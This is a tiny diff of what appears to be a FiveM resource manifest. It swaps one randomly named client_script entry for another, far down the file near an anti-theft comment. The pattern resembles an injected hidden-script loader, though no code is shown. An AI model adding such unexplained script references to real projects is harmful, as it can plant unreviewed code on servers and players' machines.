@@ -6324,6 +6324,6 @@ server_scripts {
 
 
 -- In-case someone steals this, This was created by the creators of FiveM Cops, and Lance Good.
-client_script "TalJDiXcmrWuOdRetV.lua"
 
 
+client_script "TJeKc.lua"
